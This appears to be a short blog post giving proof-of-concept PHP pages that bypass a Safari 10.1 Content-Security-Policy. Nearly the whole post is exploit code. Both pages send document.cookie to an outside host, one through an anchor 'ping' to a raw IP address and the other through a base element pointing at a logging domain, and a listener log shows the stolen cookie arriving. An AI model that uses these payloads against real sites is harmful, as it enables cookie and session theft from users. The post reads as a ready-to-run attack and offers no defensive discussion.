---
layout: post
title: Safari 10.1 Browser unsafe-inline CSP Bypass
---

####  cat safari_12.php

	<?php
	    header("Content-Security-Policy: default-src none 'unsafe-inline'");
	?>
	<script>
	x = (new Date()).valueOf();
	document.cookie = "csp=" + escape("SECUREKEY321789591") + ";";
	
	n0tr00t = document.head.appendChild(document.createElement("a"));
	n0tr00t.href = "#";
	n0tr00t.ping = "http://45.32.53.191:8000/?" + x + document.cookie;
	n0tr00t.click();
	</script>

####  cat safari_15.php

	<?php
	    header("Content-Security-Policy: default-src none 'unsafe-inline'");
	?>
	<script>
    x = (new Date()).valueOf();
    document.cookie = "csp=" + escape("SECUREKEY321789591") + ";";
    
    n0tr00t = document.head.appendChild(document.createElement("base"));
    n0tr00t.href = "http://" + x + ".base.safari.vqn3j8.ceye.io/?" + document.cookie;
    </script>

#### Resutls

	root@guest:/tmp# python -m SimpleHTTPServer
	Serving HTTP on 0.0.0.0 port 8000 ...
	- - [07/Sep/2017 06:59:45] "POST /?1504767585625csp=SECUREKEY321789591;
	- - HTTP/1.1" 501